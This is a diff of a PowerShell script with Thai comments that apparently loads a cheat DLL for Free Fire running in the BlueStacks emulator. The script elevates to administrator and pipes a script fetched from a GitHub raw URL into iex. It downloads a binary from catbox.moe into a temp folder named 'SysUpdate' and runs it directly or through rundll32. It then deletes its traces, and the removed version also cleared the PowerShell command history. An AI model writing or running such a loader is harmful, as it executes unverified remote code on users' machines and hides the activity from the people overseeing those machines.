@@ -1,79 +1,60 @@
-# =========================================================
-# 1. ขอสิทธิ์ Administrator และรันสคริปต์จาก GitHub
-# =========================================================
+# 1. ขอสิทธิ์ Admin
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # แก้ไข Syntax การตั้งค่า TLS และรัน GitHub Script ให้รองรับ PowerShell ทุกเวอร์ชัน
     $adminCmd = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (Invoke-RestMethod 'https://raw.githubusercontent.com/potae112/Cmdfreefire/main/dugduy.ps1')"
     Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$adminCmd`"" -Verb RunAs
     exit
 }
 
-# =========================================================
-# 2. ตั้งค่าไฟล์และตำแหน่ง (เน้นเนียนและจัดการง่าย)
-# =========================================================
+# 2. ตั้งค่า
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$url = "https://files.catbox.moe/0ukxya.dll" # **ต้องมั่นใจว่าไฟล์ต้นทางคือ .zip เท่านั้น**
+$url = "https://files.catbox.moe/0ukxya.dll"
 $workDir = "$env:LOCALAPPDATA\Temp\SysUpdate"
-$zipPath = Join-Path $workDir "package.zip"
+$downloadPath = Join-Path $workDir "downloaded_file" # โหลดมาพักไว้ก่อน
 $blueStacksPath = "C:\Program Files\BlueStacks_nxt\HD-Player.exe"
 
-# สร้างโฟลเดอร์ทำงาน
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
-# =========================================================
-# 3. ดาวน์โหลดและแตกไฟล์ (PowerShell Native)
-# =========================================================
-Write-Host "[*] Downloading System Components..." -ForegroundColor Cyan
+# 3. ดาวน์โหลด
+Write-Host "[*] Downloading Component..." -ForegroundColor Cyan
 try {
-    Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
+    Invoke-WebRequest -Uri $url -OutFile $downloadPath -UseBasicParsing -ErrorAction Stop
 } catch {
-    Write-Host "[!] Download failed: Check your internet or URL." -ForegroundColor Red
-    Pause; exit
+    Write-Host "[!] Download failed." -ForegroundColor Red; Pause; exit
 }
 
-Write-Host "[*] Extracting Package..." -ForegroundColor Cyan
-try {
-    # ใช้ Expand-Archive แทน tar เพื่อรองรับ Windows ทุกรุ่น
-    Expand-Archive -Path $zipPath -DestinationPath $workDir -Force
-} catch {
-    Write-Host "[!] Error: The file at URL might not be a valid .zip file." -ForegroundColor Yellow
-}
+# 4. ตรวจสอบว่าเป็น Zip หรือ DLL (หัวใจสำคัญที่แก้ Error)
+$fileMagic = -join ((Get-Content $downloadPath -Encoding Byte -TotalCount 2) | ForEach-Object { "{0:X2}" -f $_ })
 
-# =========================================================
-# 4. ค้นหาไฟล์ .exe และเตรียม DLL
-# =========================================================
-$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
-$dllName = "Memory.dll" # เปลี่ยนชื่อให้ตรงกับไฟล์จริงใน .zip ของคุณ
-$dllPath = Join-Path $workDir $dllName
-
-if (!(Test-Path $dllPath)) {
-    $foundDll = Get-ChildItem -Path $workDir -Filter "*.dll" -Recurse | Select-Object -First 1
-    if ($foundDll) { Copy-Item $foundDll.FullName -Destination $workDir }
-}
-
-# =========================================================
-# 5. สั่งรันระบบ
-# =========================================================
-if ($exe) {
-    Write-Host "[+] Launching Service: $($exe.Name)" -ForegroundColor Green
-    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
-} else {
-    Write-Host "[!] No Executable found. Trying DLL Proxy..." -ForegroundColor Yellow
-    # ถ้าไม่มี .exe ให้ลองรันผ่าน rundll32 ตามแผนสำรอง
-    if (Test-Path $dllPath) {
-        Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$dllPath`",Control_RunDLL `"$blueStacksPath`"" -Wait
+if ($fileMagic -eq "504B") { # 504B คือรหัสขึ้นต้นของไฟล์ ZIP (PK)
+    Write-Host "[*] Extracting Zip Package..." -ForegroundColor Cyan
+    try {
+        Expand-Archive -Path $downloadPath -DestinationPath $workDir -Force
+        Remove-Item $downloadPath
+    } catch { 
+        Write-Host "[!] Extraction failed." -ForegroundColor Yellow 
     }
+} else {
+    Write-Host "[*] File is a direct DLL. Moving to work directory..." -ForegroundColor Cyan
+    Move-Item $downloadPath (Join-Path $workDir "SystemData.dll") -Force
 }
 
-# =========================================================
-# 6. ทำลายร่องรอย (Cleanup)
-# =========================================================
+# 5. รันระบบ (เช็คทั้ง EXE และ DLL)
+$exe = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
+$dll = Get-ChildItem -Path $workDir -Filter "*.dll" -Recurse | Select-Object -First 1
+
+if ($exe) {
+    Write-Host "[+] Launching: $($exe.Name)" -ForegroundColor Green
+    Start-Process -FilePath $exe.FullName -WorkingDirectory $exe.DirectoryName -Wait
+} elseif ($dll) {
+    Write-Host "[+] Launching via DLL Proxy..." -ForegroundColor Green
+    # รัน DLL ผ่าน rundll32
+    Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$($dll.FullName)`",Control_RunDLL `"$blueStacksPath`"" -Wait
+} else {
+    Write-Host "[!] Error: No executable or DLL found." -ForegroundColor Red
+}
+
+# 6. Cleanup
 Write-Host "[*] Cleaning up traces..." -ForegroundColor Gray
 Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
-
-# ล้างประวัติคำสั่งล่าสุด
-$history = (Get-PSReadLineOption).HistorySavePath
-if (Test-Path $history) { Clear-Content $history }
-
 Write-Host "[+] Done." -ForegroundColor Green
